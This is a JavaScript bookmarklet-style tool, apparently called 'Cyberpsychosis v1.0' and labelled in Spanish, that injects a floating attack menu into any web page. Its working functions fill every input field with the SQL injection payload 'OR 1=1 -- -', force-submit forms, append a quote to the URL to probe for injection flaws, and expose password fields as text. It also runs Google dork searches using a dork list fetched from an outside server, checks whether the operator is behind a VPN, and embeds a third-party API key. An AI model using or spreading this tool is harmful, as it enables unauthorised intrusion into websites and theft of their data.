let mainAct = () => {
  alert(`Cyberpsychosis v1.0`)
  const webMenuHTML = document.createElement('div')
const webMenuCSS = document.createElement('style')
//const webMenuJS = document.createElement('script')
webMenuHTML.setAttribute('class', 'fab-container')
webMenuHTML.setAttribute('id', 'draggableFab')
//webMenuJS.setAttribute('type', 'text/javascript')

const webMenuHTMLinner = `
    <button class="fab"><b><></b></button>
    <div class="fab-menu" id="fabMenu" style="text-align: center;">
    <p style="color: #fff; font-size: 7px; border-bottom: 1px solid #333; padding: 5px 0;"><b>VPN:</b> <b id="vSt" style= "color: #f00;">Inactivo</b></p>
      <a id="op1"><b>'OR 1=1 all inp</b></a>
      <a id="op2"><b>Force submit</b></a>
      <a id="op3"><b>chk id ' vuln</b></a>
      <a id="op4"><b>Forzar inpts a txt</b></a>
            <select id="dSel" style="background: none;
  border: none;
  border-bottom: 1px solid #ddd;
  color: #fff;
  font-size: 10px;
  outline: 0; padding: 5px 0;">
      <option>Dorks Esp. Latam</option>
      </select>
      <div style="display: flex;">
      <input id="drk" type="text" placeholder="Dork">
      <a id="op5" style="background: #333; border-bottom: 1px solid #ddd; 
        border-left: 1px solid #ddd;
      color: #fff;display: inline-block; width: 30%;"><b>Dorkear</b></a>
      </div>
    </div>
`

webMenuHTML.innerHTML = webMenuHTMLinner
document.body.append(webMenuHTML)

const webMenuCSSinner = `
.fab-container {
  position: fixed;
  bottom: 20px;
  right: 20px;
  z-index: 999999999999999;
}

.fab {
  backdrop-filter: blur(3px);
  background-color: rgba(255, 255, 0, 0.5);
  color: rgb(0, 42, 77);
  border: none;
  border-radius: 50%;
  width: 60px;
  height: 60px;
  font-size: 24px;
  cursor: pointer;
  box-shadow: 0 4px 6px rgba(0,0,0,0.3);
}

.fab-menu {
  color: #fff;
  display: none;
  flex-direction: column;
  position: absolute;
  right: 70px;
  bottom: 0;
  backdrop-filter: blur(3px);
  //background: url('../img/kira.jpeg');
  background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSFOoif5tA6yeFlT7o-xoQ_MZQIUR01E50_Ig0sii_n_K0ieNC6cYq9zFtJ&s=10') no-repeat center center;
      background-size: 100% 100%;
  //background-color: rgba(98, 0, 238, 0.3);
  border-radius: 10px;
  box-shadow: 0 4px 6px rgba(0,0,0,0.2);
  font-size: 10px;
  height: 200px;
  overflow: hidden;
  opacity: .8;
  width: 200px;
}

.fab-menu a {
  display: inline-block;
  padding: 5px 10px;
  text-align: start;
  text-decoration: none;
  color: #fff;
  border-bottom: 1px solid #ddd;
  width: 100%;
}

.fab-menu a:hover {
  background-color: rgb(0, 42, 77);
  color: rgb(255, 255, 0) !important;
}

.fab-menu a:last-child {
  border-bottom: none;
}

.fab-menu.show {
  display: flex;
}

.fab-menu input {
   background: none;
   border: none;
   border-bottom: 1px solid #ddd;
   color: #4AE9FE;
   outline: none;
   padding: 0 0 0 5px;
   width: 70%;
}

.fab-menu input:hover {
   background-color: rgb(0, 42, 77);
   //color: rgb(255, 255, 0) !important;
}

.fab-menu select:hover {
  background-color: rgb(0, 42, 77);
  color: rgb(255, 255, 0) !important;
}

`

webMenuCSS.innerHTML = webMenuCSSinner
document.body.append(webMenuCSS)
  
  function toggleMenu() {
  const menu = document.getElementById('fabMenu');
  menu.classList.toggle('show');
}

const draggable = document.getElementById('draggableFab');
let offsetX, offsetY, isDragging = false;

function setPosition(x, y) {
  draggable.style.left = `${x - offsetX}px`;
  draggable.style.top = `${y - offsetY}px`;
  draggable.style.bottom = 'auto';
  draggable.style.right = 'auto';
}

// Mouse events
draggable.addEventListener('mousedown', (e) => {
  offsetX = e.clientX - draggable.offsetLeft;
  offsetY = e.clientY - draggable.offsetTop;
  isDragging = true;
  draggable.style.cursor = 'grabbing';
  document.body.style.overflow = 'hidden';
});

document.addEventListener('mousemove', (e) => {
  if (isDragging) setPosition(e.clientX, e.clientY);
});

document.addEventListener('mouseup', () => {
  isDragging = false;
  draggable.style.cursor = 'grab';
  document.body.style.overflow = '';
});

// Touch events
draggable.addEventListener('touchstart', (e) => {
  const touch = e.touches[0];
  document.body.style.overflow = 'hidden';
  offsetX = touch.clientX - draggable.offsetLeft;
  offsetY = touch.clientY - draggable.offsetTop;
  isDragging = true;
}, { passive: false });

document.addEventListener('touchmove', (e) => {
  if (!isDragging) return;
  const touch = e.touches[0];
  setPosition(touch.clientX, touch.clientY);
}, { passive: false });

document.addEventListener('touchend', () => {
  isDragging = false;
  document.body.style.overflow = '';
});

document.querySelector('.fab').addEventListener('click', () => {
  toggleMenu()
})

document.querySelector('#op1').addEventListener('click', () => document.querySelectorAll('input').forEach((inp) => inp.value = "'OR 1=1 -- -"))
document.querySelector('#op2').addEventListener('click', () => document.querySelector('form').submit())

document.querySelector('#op3').addEventListener('click', () => location.href = location.href + "'")

document.querySelector('#op4').addEventListener('click', () => {
  document.querySelectorAll('input').forEach((inp) => inp.addEventListener('input', () => {
    inp.setAttribute('type', 'text')
  })
)
})

document.querySelector('#op5').addEventListener('click', () => {
  const drk = document.querySelector('#drk').value
  if(drk) location.href = `https://www.google.com/search?q=inurl:${drk}`
})
/*
*/

const vpnChk = (ip) => {
  fetch(`https://vpnapi.io/api/${ip}?key=c59d7206bc964ea88ed4e8605158ec86`)
    .then(response => response.json())
    .then(data => {
      if (data.security.vpn) {
        const vSt = document.querySelector('#vSt')
        vSt.innerHTML = 'Activo'
        vSt.style = 'color: #0f0;'
      }
    })
    .catch(error => console.error('Error:', error))
}

fetch("https://ipapi.co/json")
    .then(response => response.json())
    .then(data => {
      if (data) {
         vpnChk(data.ip)
      }
    })
    .catch(error => console.error('Error:', error))

fetch('https://instools.onrender.com/dorks')
  .then(response => response.json())
  .then(data => {
    const dSel = document.querySelector('#dSel')
    //alert(data[0].dork)
    data.forEach((obj) => {
      const opt = document.createElement('option')
      opt.text = obj.dork
      opt.value = obj.dork
      dSel.appendChild(opt)
      dSel.addEventListener('change', () => document.querySelector('#drk').value = dSel.value)
    })
  })
}